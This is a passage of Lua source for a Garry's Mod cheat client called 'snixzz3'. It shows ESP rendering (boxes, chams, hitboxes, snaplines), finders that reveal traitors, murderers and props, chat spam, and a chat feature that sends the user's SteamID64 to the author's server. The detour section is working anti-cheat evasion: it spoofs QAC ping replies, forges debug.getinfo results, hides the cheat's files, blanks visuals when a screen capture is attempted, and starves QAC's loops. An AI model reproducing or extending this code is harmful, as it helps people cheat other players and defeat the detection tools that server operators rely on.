				G.draw.SimpleText( v:GetClass(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
				textpos = textpos + 12
				
			end	
			
			if snixzz.Bools["esp_health_text"] then
			
				if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] && snixzz.IsProp( v ) then
				
					G.draw.SimpleText( "HP: " .. v:GetOwner():Health(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
					textpos = textpos + 12

				elseif !snixzz.Entities[v:GetClass()] then
						
					G.draw.SimpleText( "HP: " .. v:Health(), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
					textpos = textpos + 12
						
				end
					
			end	
			
			-- Health Bar
			if snixzz.Bools["esp_health_bar"] && !snixzz.Entities[v:GetClass()] then
				
				local health = v:Health()
					
				if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] && snixzz.IsProp( v ) then
						
					health = v:GetOwner():Health()
						
				end
					
				G.surface.SetDrawColor( Color( 0, 0, 0 ) )
				G.surface.DrawRect( x1 -6, y1, 3, diff2 )
				G.surface.SetDrawColor( Color( 0, 255, 0 ) )
				G.surface.DrawRect( x1 - 6, y2 - diff2 / 100 * health, 3, diff2 / 100 * health )

			end
			
			-- ESP weapon
			if v:IsPlayer() or v:IsNPC() then
			
				if snixzz.Bools["esp_weapon"] then
						
					G.draw.SimpleText( weapon, "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
					textpos = textpos + 12
						
				end
				
				-- Snaplines
				if snixzz.Bools["esp_snaplines"] then
						
					startx = G.ScrW() / 2
					starty = G.ScrH() / 2
					endpos = playerPos:ToScreen()
							
					G.surface.SetDrawColor( color )
					G.surface.DrawLine( startx, starty, endpos.x, endpos.y )
						
				end
		
			end	
				
			-- Distance ESP
			if snixzz.Bools["esp_distance"] then
				
				G.draw.SimpleText( "D: " .. G.math.Round( v:GetPos():Distance( G.LocalPlayer():GetPos() ) ), "ESPFont", x2 + 2, y1 + textpos, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT )
				textpos = textpos + 12
					
			end
				
				
			// Box ESP
			if snixzz.Bools["esp_box"] then
				
				snixzz.DrawOutlinedBox( x1, y1, diff, diff2, snixzz.Vars["esp_box_width"], color )
				
			end
			
			-- taken from newsbot for debug purposes
			if snixzz.Bools["esp_hitbox"] then
				
				for group = 0, EntM.GetHitBoxGroupCount( v ) do
				
					local count = EntM.GetHitBoxCount( v, group ) - 1
					
					for hitbox = 0, count do
					
						local bone = EntM.GetHitBoxBone( v, hitbox, group )
						
						if !bone then continue end
						
						local min, max = EntM.GetHitBoxBounds( v, hitbox, group )
						
						local bonepos, boneang = EntM.GetBonePosition( v, bone )
						
						G.cam.Start3D()
							
							if snixzz.Vars["aim_target_method"] == "Hitscan" && snixzz.TargetBone != nil && bone == snixzz.TargetBone then
							
								G.render.DrawWireframeBox( bonepos, boneang, min, max, Color( 255, 0, 0 ), true )
							
							else
							
								G.render.DrawWireframeBox( bonepos, boneang, min, max, Color( 255, 255, 255 ), true )
								
							end
							
						G.cam.End3D()
						
					end
					
				end
				
			end
				
			-- Chams! Much faster than RenderScreenSpaceEffects
			if snixzz.Bools["esp_chams"] then
				
				G.cam.Start3D()
					
					if snixzz.Vars["esp_chams_material"] == "Solid" then
						
						v:SetMaterial( "models/debug/debugwhite" )
						
					elseif snixzz.Vars["esp_chams_material"] == "Wireframe" then
					
						v:SetMaterial( "models/wireframe" )
					
					elseif snixzz.Vars["esp_chams_material"] == "XQZ" then
						
						v:SetMaterial( "" )
						
					end
						
					-- Weapon Chams
					if v:IsPlayer() or v:IsNPC() then
					
						if G.IsValid( v:GetActiveWeapon() ) then
							
							v:GetActiveWeapon():DrawModel()
							
						end
						
					end
						
					-- Player chams
					if snixzz.Vars["esp_chams_material"] != "XQZ" then
						
						G.render.SetColorModulation( color.r / 255, color.g / 255, color.b / 255 )
						
					end
					
					v:DrawModel()	
					//v:SetColor( Color( 255, 255, 255 ) )	
					v:SetMaterial( "" )

				G.cam.End3D()
				
			end
									
			-- For prediction testing & shit
			if snixzz.Bools["esp_aimpos"] then
				
				local predictedPos = snixzz.Prediction( playerPos, v ):ToScreen()
			
				G.draw.RoundedBox( 4, predictedPos.x, predictedPos.y, 7, 7, Color( 255, 0, 0, 255 ) )
				
			end
			
		else
		
			continue
			
		end	
	
	end

	// Aim status & shit
	if snixzz.Bools["esp_status"] then
		
		G.draw.DrawText( snixzz.Status, "snixzz_status", G.ScrW() / 2, G.ScrH() * 0.5 + 50, snixzz.StatusColor, TEXT_ALIGN_CENTER )
		
	end
	
	// Crosshair
	local x = ScrW() / 2
	local y = ScrH() / 2
	
	local crosscolor = Color( 0, 0, 0, 255 )
	local crosslength = 50
	local gap = 2
	
	local boxsize = 5
		
	-- Box
	if snixzz.Bools["esp_crosshair_box"] then
		
		G.surface.SetDrawColor( snixzz.Color( Color( 255, 255, 255 ) ) )
		G.surface.DrawOutlinedRect( x - boxsize - 2, y - boxsize - 2, ( boxsize + 2 ) * 2 + 1, ( boxsize + 2 ) * 2 + 1 )
		
	end
	
	-- Crosshair
	if snixzz.Bools["esp_crosshair"] then
		
		G.surface.SetDrawColor( snixzz.Color( Color( 0, 0, 0, 255 ) ) )
		G.surface.DrawLine( x - crosslength, y, x - gap, y )
		G.surface.DrawLine( x + crosslength, y, x + gap, y )
		
		G.surface.DrawLine( x, y - crosslength, x, y - gap )
		G.surface.DrawLine( x, y + crosslength, x, y + gap )
		
	end
	
end

snixzz.properCurTime = 0
snixzz.LagVar = 12
snixzz.LagTicks = 0
local dynLight
function snixzz.Move()

	if G.IsFirstTimePredicted() then return end
	snixzz.properCurTime = G.CurTime() + G.engine.TickInterval()	
			
	// No hands
	if snixzz.Bools["esp_nohands"] then
		
		snixzz.Functions.NoDraw( G.Material( "models/weapons/v_models/hands/v_hands" ), true )
		
	else
	
		snixzz.Functions.NoDraw( G.Material( "models/weapons/v_models/hands/v_hands" ), false )
		
	end	
			
end

local alphabet = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"}

function snixzz.Namechanger()
	
	/*if snixzz.Bools["misc_namechanger"] then
		
		snixzz.NextName = G.table.Random( G.player.GetAll() ):Nick()
		G.chat.AddText( Color( 0, 255, 255 ), "[snixzz3] Changed your name to " .. snixzz.NextName ) 
		
		if snixzz.IsDarkRP then
			
			-- Overly comlpicated Steam name stealer & RP name stealer. Accuse 2 different people at once.
			snixzz.NextName = G.table.Random( G.player.GetAll() ):Nick()
			//snixzz.Functions.ConCommand( "name " .. snixzz.NextName .. " %" )
			//snixzz.Functions.SetName( snixzz.NextName .. " %" )
			
			G.timer.Simple( 0.5, function()
				snixzz.NextName = G.table.Random( G.player.GetAll() ):Nick()
				snixzz.Functions.ConCommand( "darkrp rpname " .. snixzz.NextName .. "q" ) -- ** TODO: CHANGE q TO SOMETHING ELSE.
			end )
			
		else
			
			snixzz.NextName = G.table.Random( G.player.GetAll() ):Nick()
			//snixzz.Functions.ConCommand( "name " .. snixzz.NextName .. " %" )
			//snixzz.Functions.SetName( snixzz.NextName .. " %" )
			
		end
		
	end*/
	
end

function snixzz.ChatSpam()

	if snixzz.Bools["misc_chat_spam"] then
	
		if snixzz.Vars["misc_chat_spam_method"] == "Advertise" then
	
			G.RunConsoleCommand( "say", G.Either( snixzz.IsDarkRP, "/ooc " .. snixzz.Vars["misc_chat_spam_message"], snixzz.Vars["misc_chat_spam_message"] ) )
			
		elseif snixzz.Vars["misc_chat_spam_method"] == "Yo Momma Jokes" then	
			
			G.http.Fetch( "http://api.yomomma.info/", 
				
				function( body )
					
					if body && body != "" then
						
						G.RunConsoleCommand( "say", G.Either( snixzz.IsDarkRP,  "/ooc " .. util.JSONToTable( body )["joke"], util.JSONToTable( body )["joke"] ) )
						
					end
					
				end,
				
				function( error )
					
					snixzz.Chat( snixzz.Colors.Red, "Unable to grab joke from API! (" .. error .. ")" )
					
				end
			
			)			
			
		elseif snixzz.Vars["misc_chat_spam_method"] == "Jokes" then
			
			G.http.Fetch( "http://tambal.azurewebsites.net/joke/random", 
				
				function( body )
					
					if body && body != "" then
						
						G.RunConsoleCommand( "say", G.Either( snixzz.IsDarkRP,  "/ooc " .. util.JSONToTable( body )["joke"], util.JSONToTable( body )["joke"] ) )
						
					end
					
				end,
				
				function( error )
					
					snixzz.Chat( snixzz.Colors.Red, "Unable to grab joke from API! (" .. error .. ")" )
					
				end
			
			)
			
		end

	end	
	
end

snixzz.CorrectAngles = {}

// Idk where this came from but it's shit

/*
function snixzz.AAA()

	for k, v in G.next, G.player.GetAll() do
		
		if v == G.LocalPlayer() then continue end
		
		local pitch, yaw = v:EyeAngles().x, v:EyeAngles().y
		local sid = v:SteamID()
		
		if !snixzz.CorrectAngles[sid] then
			
			snixzz.CorrectAngles[sid] = { ["p"] = 0, ["y"] = 0 }
			
		end
		
		-- pitch
		if snixzz.CorrectAngles[sid]["p"] == 1 then
			
			pitch = 89
			
		elseif snixzz.CorrectAngles[sid]["p"] == 2 then
			
			pitch = -89
			
		end
		
		-- yaw
		if snixzz.CorrectAngles["y"] == 1 then
			
			yaw = yaw - 45
			
		elseif snixzz.CorrectAngles["y"] == 2 then
			
			yaw = yaw + 45
			
		else
			
			yaw = yaw - 180
			
		end
			
		_R.Entity.SetPoseParameter( v, "aim_pitch", pitch )
		_R.Entity.SetPoseParameter( v, "body_yaw", 0 )
		_R.Entity.SetPoseParameter( v, "aim_yaw", 0 )
		_R.Entity.InvalidateBoneCache( v )
		_R.Entity.SetRenderAngles( v, G.Angle( 0, G.math.NormalizeAngle( yaw ), 0 ) )
		
	end

end*/

/*
	
		
	Traitor, Prophunt, & Murder Finders.
	

*/
snixzz.Traitors = {}
snixzz.Murderers = {}
snixzz.ClearedMurderers = false
snixzz.ClearedTraitors = false
local t

function snixzz.IsMurderer( v )

	if v:HasWeapon( "weapon_mu_knife" ) then
	
		return true
		
	end
	
	if G.table.HasValue( snixzz.Murderers, v ) then 
	
		return true
		
	end
	
	return false

end

function snixzz.HasMagnum( v )

	if v:HasWeapon( "weapon_mu_magnum" ) then
	
		return true
		
	end
	
	return false

end

local testtab = {}
function snixzz.IsProp( v )
	
	if v:GetOwner() != nil then
		
		local owner = v:GetOwner()
		
	else
		
		return false
		
	end
	
	if v:GetClass() == "ph_prop" && owner != G.LocalPlayer() then
		
		return true
		
	end
	
	return false

end

function snixzz.IsTraitor( v )
	
	if G.table.HasValue( snixzz.Traitors, v ) or G.LocalPlayer():IsTraitor() && v:IsTraitor() then
		
		return true
		
	end
	
	return false
end

function snixzz.GetTraitors()
	
	if !snixzz.IsTTT then return end
	
	if !snixzz.Bools["misc_traitor_finder"] then return end
		
	for k, v in G.next, G.ents.GetAll() do
			
		if _G.GetRoundState() == 3 && v:IsWeapon() && v:GetOwner():IsPlayer() && v.Buyer == nil && v.CanBuy && G.table.HasValue( v.CanBuy, 1 ) && !G.table.HasValue( snixzz.Traitors, v:GetOwner() ) then
				
			local t = v:GetOwner()
				
			if t:GetRole() == 2 then
					
				v.Buyer = t
				
				snixzz.ClearedTraitors = false
					
			else
					
				G.table.insert( snixzz.Traitors, t )
				
				snixzz.ClearedTraitors = false
				
				snixzz.Chat( G.Color( 255, 0, 0 ), t:Nick() .. " bought traitor weapon '" .. v:GetClass() .. "'" )
					
			end
				
		elseif GetRoundState() != 3 then
				
			if !snixzz.ClearedTraitors then
		
				snixzz.Traitors = {}
				snixzz.Chat( color_white, "Cleared traitors table." )
				snixzz.ClearedTraitors = true
			
				
			end
			
		end
		
	end
	
end


/*
	DETOURS
*/

// thanks for old code daz, miss u buddy. <3
function snixzz.SpoofQACPing()

	local int = G.net.ReadInt( 10 )
	
	G.net.Start( "Debug1" )
	
		G.net.WriteInt( int, 16 )
		
	G.net.SendToServer()
	
	snixzz.AddToConsole( "Spoofed QAC ping" )

end

local function no()

	snixzz.ACNotify( "Blocked incoming QAC net message" )

	return
	
end

snixzz.AAC = {

	["FakeFiles"] = {
		"demo_recording.lua",
		"vgui/dbutton.lua",
		"vgui/dgrid.lua",
		"menu/menu.lua",
		"menu/mainmenu.lua",
		"menu/loading.lua",
		"menu/video.lua",
		"menu/errors.lua",
	},
	
	["Receivers"] = {
	
		["Debug2"] = snixzz.SpoofQACPing,
		["gcontrol_vars"] = function() 
			
			G.net.Start( "gcontrol_vars" )
			
				G.net.WriteBit()
				
			G.net.SendToServer()
			
		end,
		["control_vars"] = no,
		["checksaum"] = no,
	
	},
	
}

function snixzz.CreateDetours()
	
	debug.getinfo = snixzz.Detour( debug.getinfo, function()
	
		return { 
			what = "C",
			source = "[C]",
			source_src = "[C]",
			linedefined = -1,
			currentline = -1,
			lastlinedefined = -1,
			short_src = "[C]",
		}
		
	end )
	
	_R.Entity.FireBullets = snixzz.Detour( _R.Entity.FireBullets, function( e, bullet )
		
		local wep = G.LocalPlayer():GetActiveWeapon()
		
		snixzz.Cones.Normal[ wep:GetClass() ] = bullet["Spread"]
		
		if snixzz.RecoilBackup[ wep:GetClass() ] == nil then
		
			snixzz.AddToConsole( "Saving recoil backup for '" .. wep:GetClass() .. "' (" .. wep.Primary.Recoil .. ")" )
		
			snixzz.RecoilBackup[ wep:GetClass() ] = wep.Primary.Recoil or 0
		
		end
		
		if snixzz.Predicting then return end
		
		return snixzz.Detours[ _R.Entity.FireBullets ]( e, bullet )
	end )
	
	WepM.SendWeaponAnim = snixzz.Detour( WepM.SendWeaponAnim, function( ... )
	
		if snixzz.Predicting then return end
		
		return snixzz.Detours[WepM.SendWeaponAnim]( ... )
	
	end )

	render.Capture = snixzz.Detour( render.Capture, function( data )

		
		snixzz.AddToConsole( "An anti-cheat attempted to capture your screen, disabling visuals for 5 seconds." )
		
		snixzz.Panic = true
		
		if snixzz.MenuOpen == true then
			
			snixzz.Frame:SetVisible( false )
			snixzz.MenuOpen = false
			
		end
		
		G.timer.Simple( 5, function()
		
			snixzz.Panic = false

			snixzz.ACNotify( "Your visuals were disabled due to a screen grab detection." )
			
		end )
		
		return data
	end )

	
	
	
		render_Capture = snixzz.Detour( render.Capture, function( data )

		
		snixzz.AddToConsole( "An anti-cheat attempted to capture your screen, disabling visuals for 5 seconds." )
		
		snixzz.Panic = true
		
		if snixzz.MenuOpen == true then
			
			snixzz.Frame:SetVisible( false )
			snixzz.MenuOpen = false
			
		end
		
		G.timer.Simple( 5, function()
		
			snixzz.Panic = false

			snixzz.ACNotify( "Your visuals were disabled due to a screen grab detection." )
			
		end )
		
		return data
	end )
	
	
	
	
	
	
	
	file.Exists = snixzz.Detour( file.Exists, function( filename, dir )
		
		snixzz.LogDetour( "file.Exists( '" .. filename .. "', '" .. dir .. "' )" )
		
		if G.string.find( filename, "snixzz" ) then
			
			snixzz.ACNotify( "An anti-cheat attempted to search for snixzz" )
			return false
			
		else
		
			return snixzz.Detours[ file.Exists ]( filename, dir )
			
		end
		
	end )

	file.Read = snixzz.Detour( file.Read, function( filename, dir )
		
		snixzz.LogDetour( "file.Read( '" .. filename .. "', '" .. dir .. "' )" )
		
		if G.string.find( filename, ".lua" ) then
			
			snixzz.ACNotify( "An anti-cheat attempted to search for a .lua file '" .. filename .. "'" )
			return "print( 'Hello World' )"
			
		else
			
			return snixzz.Detours[ file.Read ]( filename, dir )
			
		end
		
	end )

	file.Find = snixzz.Detour( file.Find, function( filename, dir )
		
		snixzz.LogDetour( "file.Find( '" .. filename .. "', '" .. dir .. "' )" )
		
		if G.string.find( filename, "snixzz" ) then 
			
			return G.table.Random( snixzz.AAC.FakeFiles )
		
		else
		
			return snixzz.Detours[ file.Find ]( filename, dir )
			
		end
		
	end )	

	net.Receive = snixzz.Detour( net.Receive, function( name, func )
			
		snixzz.LogDetour( "net.Receive( '" .. name .. "' )" )
		
		if snixzz.AAC.Receivers[name] then
			
			return snixzz.Detours[net.Receive]( name, snixzz.AAC.Receivers[name] )
			
		end
		
		return snixzz.Detours[ net.Receive ]( name, func )
	end )

	net.Start = snixzz.Detour( net.Start, function( name )
		
		if snixzz.Detours["net.Start"][name] then
			
			snixzz.ACNotify( "Blocked net.Start ( '" .. name .. "' )" )
			return
			
		else
		
			snixzz.LogDetour( "net.Start( '" .. name .. "' )" )
			return snixzz.Detours[ net.Start ]( name )
			
		end
		
	end )

	net.SendToServer = snixzz.Detour( net.SendToServer, function()
		
		//snixzz.LogDetour( "net.SendToServer()" )
		
		return snixzz.Detours[net.SendToServer]()
	end )

	net.WriteString = snixzz.Detour( net.WriteString, function( str )
		
		if G.string.find( str, "snixzz" ) then
			
			snixzz.ACNotify( "Blocked net.WriteString ( '" .. str .. "' )" )
			return "nil"
			
		else
		
			snixzz.LogDetour( "net.WriteString( '" .. str .. "' )" )
			return snixzz.Detours[ net.WriteString ]( str )
			
		end
		
	end )

	net.WriteTable = snixzz.Detour( net.WriteTable, function( tab )
			
		//local theTab = G.table.concat( tab, ", " )
		
		//snixzz.LogDetour( "net.WriteTable( { " .. theTab .. " } )" )
		
		return snixzz.Detours[net.WriteTable]( tab )
		
	end )

	_R.Player.ConCommand = snixzz.Detour( _R.Player.ConCommand, function( ply, args )

		snixzz.LogDetour( ply:Nick() .. " - _R.Player.ConCommand( '" .. args .. "' ) " )
		
		if !snixzz.Detours["Commands"][args] then
		
			return snixzz.Detours[ _R.Player.ConCommand ]( ply, args )
		
		else
			
			snixzz.ACNotify( "Blocked _R.Player.ConCommand( '" .. args .. "' )" )
			return
		
		end
		
	end )

	GetConVarNumber = snixzz.Detour( GetConVarNumber, function( cvar )
		
		if snixzz.Spoof[cvar] != nil then
			
			return snixzz.Spoof[cvar]
			
		else
			
			return snixzz.Detours[GetConVarNumber]( cvar )
			
		end
		
	end )

	snixzz.IgnoreCMDs = {
		["hvh_playheadshotsound"] = true,
		["hvh_hitsound"] = true,
		["r_cleardecals"] = true,
		["ulx_showmotd"] = true,
	}

	RunConsoleCommand = snixzz.Detour( RunConsoleCommand, function( cmd, ... )
		
		local str = cmd
		
		if !snixzz.IgnoreCMDs[cmd] then	
			
			if ... then
			
				local args = { ... }
				str = str .. ", " .. ( ... )
				
				snixzz.LogDetour( "RunConsoleCommand( '" .. cmd .. ", '" .. G.table.concat( args, "', '" ) .. "' )" )
				
			else
			
				snixzz.LogDetour( "RunConsoleCommand( '" .. cmd .. "' )")
				
			end
			
		end
		
		if !snixzz.Detours["Commands"][cmd] then
		
			return snixzz.Detours[ RunConsoleCommand ]( cmd, ... )
			
		else
			
			snixzz.ACNotify( "Blocked RunConsoleCommand( '" .. cmd .. "' )" )
			return
			
		end
		
	end )

	hook.GetTable = snixzz.Detour( hook.GetTable, function()
		
		return hookGetTableCopy
	end )
	
	IsFirstTimePredicted = snixzz.Detour( IsFirstTimePredicted, function()
	
		if snixzz.Predicting then
		
			return true
			
		end
		
		return snixzz.Detours[IsFirstTimePredicted]()
	
	end )
	
	pairs = snixzz.Detour( pairs, function( ... )
	
		local tab = { ... }
		
		local info = G.debug.getinfo( 2 )
		
		if info then
			
			local src = info.short_src
			
			if src:find( "cl_qac" ) then
				
				return snixzz.Detours[pairs]( { } )
				
			end
			
		end
		
		return snixzz.Detours[pairs]( G.unpack( tab ) )		
	
	end )
	
end

/*
	
	Menu Core
	
*/


/***************
	
	Changelog
	
****************/
snixzz.UpdateLog = "Loading..."

function snixzz.UpdateChangelog()

	
end

function snixzz.CMenu()

	snixzz.CFrame = G.vgui.Create( "DFrame" )
	snixzz.CFrame:SetPos( 20, 80 )
	snixzz.CFrame:SetSize( 430, 420 )
	snixzz.CFrame:SetTitle( "snixzz3 " .. snixzz.Info.Version .. " Changelog" )
	snixzz.CFrame:SetVisible( true )
	snixzz.CFrame:SetDraggable( true )
	snixzz.CFrame:ShowCloseButton( false )
	snixzz.CFrame:MakePopup()
	snixzz.CFrame.Paint = function() 
	
		G.draw.RoundedBox( 0, 0, 0, snixzz.CFrame:GetWide(), snixzz.CFrame:GetTall(), snixzz.Vars["misc_menucolor2"] )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, snixzz.CFrame:GetWide(), snixzz.CFrame:GetTall() )
		
	end
	
	local close = G.vgui.Create( "DButton", snixzz.CFrame )
	close:SetSize( 50, 20 )
	close:SetPos( snixzz.CFrame:GetWide() - 51, 1 )
	close:SetText( "x" )
	close:SetTextColor( G.Color( 255, 255, 255 ) )
	close:SetFont( "Trebuchet18" )
	
	close.Paint = function()
	
		G.draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
	
	end
	
	close.DoClick = function()
		
		snixzz.CFrame:Close()
		snixzz.Sound()
		snixzz.CFrame = nil
		
	end
	
	local ChangelogText = G.vgui.Create( "DTextEntry", snixzz.CFrame )
	ChangelogText:SetPos( 5, 35 )
	ChangelogText:SetSize( snixzz.CFrame:GetWide() - 10, snixzz.CFrame:GetTall() - 40 )
	ChangelogText:SetText( snixzz.UpdateLog )
	ChangelogText:SetEditable( false )
	ChangelogText:SetMultiline( true )
	
end

/*
	
	snixzz3 "IRC" (Chatbox)
	
*/

local function urlencode( str ) -- thanks random github guy
  
	if ( str ) then
      
		str = string.gsub (str, "\n", "\r\n")
		
		str = string.gsub (str, "([^%w ])", function( c )
			
			return string.format( "%%%02X", string.byte( c ) )
			
		end )
		
		str = string.gsub ( str, " ", "+" )
		
   end
   
   return str    
   
end

function snixzz.GetChatData( ply, func )

	G.http.Fetch( "http://snixzz.net/cheats/snixzz3/data/chat.json",
		
		function( body )
		
			local tab = util.JSONToTable( body )
			
			snixzz.ChatCache = tab
			
			if func then
			
				return func()
				
			end
			
		end,
		
		function( error )
		
			snixzz.Chat( Color( 255, 0, 0 ), "Failed to get chat data." )
		
		end
		
	)

end

function snixzz.SendChatMessage( ply, msg, func )
	
	local oldMsg = msg
	
	msg = urlencode( msg )

	G.http.Fetch( "http://snixzz.net/cheats/snixzz3/chat.php?steamid=" .. ply:SteamID64() .. "&msg=" .. msg,
	
		function( body )
		
			if body != "sent" then
				
				snixzz.Chat( Color( 255, 0, 0 ), "Failed to send chat message. '" .. body .. "'" )
				
			else
				
				if func then
			
					func()
				
				end
				
				snixzz.AddToConsole( "Sent chat message '" .. oldMsg .. "'" )
				
			end
			
		end,
		
		function( error )
		
			snixzz.Chat( Color( 255, 0, 0 ), "Failed to send message, try again. '" .. error .. "'" )
			
		end
		
	)
	
end

function snixzz.UpdateChatbox( bool, func )

	if !snixzz.ChatDisplay then return end
	
	for k, v in G.next, snixzz.ChatCache do
				
		local nick = v["nick"]		
		local sid = v["sid"]
		local message = v["message"]
		
		if !snixzz.ChatHistory[sid] then
		
			snixzz.ChatHistory[sid] = {}

		end
		
		if !G.table.HasValue( snixzz.ChatHistory[sid], message ) or bool == true then	
			
			if sid == "nil" then
					
				snixzz.ChatDisplay:InsertColorChange( 255, 0, 0, 255 )
					
			elseif sid == "76561198040553376" then
			
				snixzz.ChatDisplay:InsertColorChange( 0, 255, 255, 255 )
			
			else
			
				snixzz.ChatDisplay:InsertColorChange( 185, 185, 185, 255 )
				
			end 
			
			snixzz.ChatDisplay:AppendText( nick )
			
			snixzz.ChatDisplay:InsertColorChange( 255, 255, 255, 255 )
			snixzz.ChatDisplay:AppendText( ": " .. message .. "\n" )
			
			if bool == false then
				
				snixzz.Sound()
				
			end
		
			G.table.insert( snixzz.ChatHistory[sid], message )

		end
			
	end
		
	if func then
			
		func()
			
	end

end

function snixzz.UpdateWhosOnline( bool, func )

	if !snixzz.IsVIP() then return end
	
	G.http.Fetch( "http://snixzz.net/cheats/snixzz3/getonline.php", 
	
		function( body )
			
			snixzz.WhosOnline = G.util.JSONToTable( body )

			if func then
				
				func()
				
			end
			
		end,
		
		function( error )
			
			snixzz.WhosOnline = { ["fail"] = "Failed to update" }
		
		end
		
	)
	
end

snixzz.ChatboxOpen = false
snixzz.ChatUpdateData = 0
snixzz.WhosOnline = {}

function snixzz.OpenChat()
	
	if snixzz.Chatbox && snixzz.Chatbox:IsVisible() or snixzz.ChatboxOpen then return end
	
	snixzz.Chatbox = G.vgui.Create( "DFrame" )
	snixzz.Chatbox:SetTitle( "snixzz3 Chat (Experimental)" )
	snixzz.Chatbox:SetSize( 600, 240 )
	snixzz.Chatbox:SetPos( 20, ScrH() / 2 - snixzz.Chatbox:GetTall() )
	snixzz.Chatbox:ShowCloseButton( true )
	snixzz.Chatbox:SetDraggable( true )
	
	snixzz.Chatbox.Paint = function( self )
	
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 150 ) )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
	
	end
	
	snixzz.Chatbox.Think = function( self )
		
		snixzz.ChatUpdateData = snixzz.ChatUpdateData + 1
		
		if snixzz.ChatUpdateData == 3300 then
			
			snixzz.GetChatData( LocalPlayer(), function()
			
				snixzz.UpdateChatbox( false, function()
				
					snixzz.ChatUpdateData = 0
					
				end )
				
			end )
			
		end
		
		if G.input.IsKeyDown( KEY_ESCAPE ) then
			
			self:Close()
			
		end
		
	end
	
	snixzz.Chatbox.OnClose = function( self )

		snixzz.ChatHistory = {}
		snixzz.ChatCache = {}
		snixzz.ChatboxOpen = false
		
		if snixzz.OnlineFrame && snixzz.OnlineFrame:IsVisible() then
		
			snixzz.OnlineFrame:SetVisible( false )
			snixzz.OnlineFrame = nil
		
		end
		
	end
	
	snixzz.ChatEntry = vgui.Create( "DTextEntry", snixzz.Chatbox )
	snixzz.ChatEntry:SetPos( 5, snixzz.Chatbox:GetTall() - 25 )
	snixzz.ChatEntry:SetSize( snixzz.Chatbox:GetWide() - 35, 20 )
		
	snixzz.ChatEntry.OnEnter = function( self )
		
		local oldMsg = self:GetValue()
		
		if oldMsg == "" then snixzz.Chatbox:Close() return end
		
		self:SetEnabled( false )
		self:SetEditable( false )
		
		self:SetText( "Sending message..." )
		
		snixzz.SendChatMessage( LocalPlayer(), oldMsg, function() 
			
			self:SetText( "Updating chat..." )
			
			snixzz.GetChatData( LocalPlayer(), function()
			
				snixzz.UpdateChatbox( false, function()
					
					self:SetText( "Sent! Please wait 10 seconds before sending another message." )
					
					G.timer.Simple( 10, function() if IsValid( self ) then self:SetEnabled( true ) self:SetEditable( true ) self:SetText( "" ) end end )
					
				end )
			
			end )
			
		end )
		
	end	
	
	snixzz.ChatDisplay = vgui.Create( "RichText", snixzz.Chatbox )
	snixzz.ChatDisplay:SetPos( 5, 25 )
	snixzz.ChatDisplay:SetSize( snixzz.Chatbox:GetWide() - 10, snixzz.Chatbox:GetTall() - 45 )

	snixzz.ChatDisplay.PerformLayout = function( self )
	
		self:SetFontInternal( "ChatFont" )
	
	end

	snixzz.GetChatData( LocalPlayer(), function()
		
		snixzz.UpdateChatbox( true, function()
			
			snixzz.Chatbox:MakePopup()
			
			snixzz.ChatboxOpen = true
			
		end )
		
	end )
	
	if snixzz.IsVIP() then
	
		snixzz.UpdateWhosOnline( true, function()
			
			if !snixzz.Chatbox:IsVisible() then return end
			
			snixzz.OnlineFrame = G.vgui.Create( "DFrame" )
			snixzz.OnlineFrame:SetSize( 200, 120 )
			snixzz.OnlineFrame:SetTitle( "Online Users (" .. table.Count( snixzz.WhosOnline ) .. ")" )
			snixzz.OnlineFrame:SetPos( 20, ScrH() / 2 - snixzz.Chatbox:GetTall() - snixzz.OnlineFrame:GetTall() - 10 )
			snixzz.OnlineFrame:ShowCloseButton( false )
			snixzz.OnlineFrame:SetDraggable( false )
			
			snixzz.OnlineFrame.Paint = function( self )
			
				G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 125 ) )
				G.surface.SetDrawColor( Color( 0, 0, 0 ) )
				G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
			
			end
			
			snixzz.OnlineList = G.vgui.Create( "DListLayout", snixzz.OnlineFrame )
			snixzz.OnlineList:SetPos( 5, 25 )
			snixzz.OnlineList:SetSize( snixzz.OnlineFrame:GetWide() - 10, snixzz.OnlineFrame:GetTall() - 35 )

			
			if table.Count( snixzz.WhosOnline ) >= 1 then
			
				for k, v in G.next, snixzz.WhosOnline do
					
					local pButton = snixzz.OnlineList:Add( "DButton" )
					pButton:SetText( v )
					pButton:SetSize( snixzz.OnlineList:GetWide() - 10, 15 )
					pButton:SetTextColor( color_white )
					pButton:SetFont( "ChatFont" )

					pButton.Paint = function( self )
						
						G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 50 ) )
						G.surface.SetDrawColor( color_white )
						G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
						
					end
					
					pButton.DoClick = function( self )
					
						gui.OpenURL( "http://steamcommunity.com/profiles/" .. util.NiceFloat( k ) )
					
					end
					
				end
				
			else
				
				local pButton = snixzz.OnlineList:Add( "DButton" )
				pButton:SetText( "No one :(" )
				pButton:SetSize( snixzz.OnlineList:GetWide() - 10, 15 )
				pButton:SetTextColor( Color( 255, 0, 0 ) )
				pButton:SetFont( "ChatFont" )

				pButton.Paint = function( self )
						
					G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 50 ) )
					G.surface.SetDrawColor( Color( 255, 0, 0 ) )
					G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
						
				end
				
			end
				
		
		end )
	
	end

end

/*
	
	
	Custom Console

	
*/

